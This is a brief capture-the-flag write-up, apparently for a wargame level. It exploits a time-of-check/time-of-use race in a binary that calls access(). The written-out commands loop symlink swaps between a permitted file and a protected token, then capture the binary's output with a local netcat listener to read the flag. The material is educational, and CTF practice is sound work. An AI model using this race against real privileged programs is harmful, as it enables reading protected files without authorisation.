This binary take two args. The first for a file to open and read and the second for the host. We can see with ltrace that the program use the access function that is vulnerable to race condition exploit.
We can create a loop that build sym link very fast between token (file with no rights for us) and the executable (file with rights).

$> while true; do ln -fs ~/level10 /tmp/link; ln -fs ~/token /tmp/link; done&

We store the output of netcat into a file (We can see the port with ltrace).

$> nc -lk 6969 > /tmp/out&

Now we just have to launch the program with our sym link until it point to token after the verification.

$> ./level10 /tmp/link 127.0.0.1

If we check the output of netcat the flag is present.

$> cat /tmp/out
